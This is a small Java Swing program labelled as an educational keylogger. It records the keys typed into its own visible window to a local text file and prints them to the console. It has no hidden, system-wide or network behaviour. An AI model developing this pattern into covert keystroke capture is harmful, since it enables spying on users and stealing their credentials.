/**
 * Keylogger (Educational Purpose Only)
 *
 * Author: Your Name
 * Date: September 21, 2024
 *
 * Description: 
 * This simple keylogger logs keystrokes to a text file. It is for educational and ethical purposes only.
 * Use this program in accordance with all legal and ethical guidelines.
 *
 * Disclaimer: Unauthorized access or usage of this software is illegal and punishable by law. 
 * Use only on systems where you have explicit permission.
 *
 * Features:
 * - Logs keypresses to a file.
 */

 import java.io.FileWriter;
 import java.io.IOException;
 import java.util.Date;
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.KeyEvent;
 import java.awt.event.KeyListener;
 
 public class Keylogger extends JFrame implements KeyListener {
 
     private static final String LOG_FILE = "keylog.txt";  // Log file to save keystrokes
 
     // Constructor to set up the window and add the key listener
     public Keylogger() {
         setTitle("Keylogger (Educational Purpose Only)");
         setSize(400, 300);
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         setVisible(true);
         addKeyListener(this);
     }
 
     // log key presses to a file
     private void logKeyToFile(String key) {
         try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
             writer.write(new Date() + ": " + key + "\n");
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
     // capture key
     @Override
     public void keyTyped(KeyEvent e) {
         String key = String.valueOf(e.getKeyChar());
         System.out.println("Key Typed: " + key);
         logKeyToFile(key);
     }
 
     @Override
     public void keyPressed(KeyEvent e) {}
 
     @Override
     public void keyReleased(KeyEvent e) {}
 
     public static void main(String[] args) {
         new Keylogger();
     }
 }
 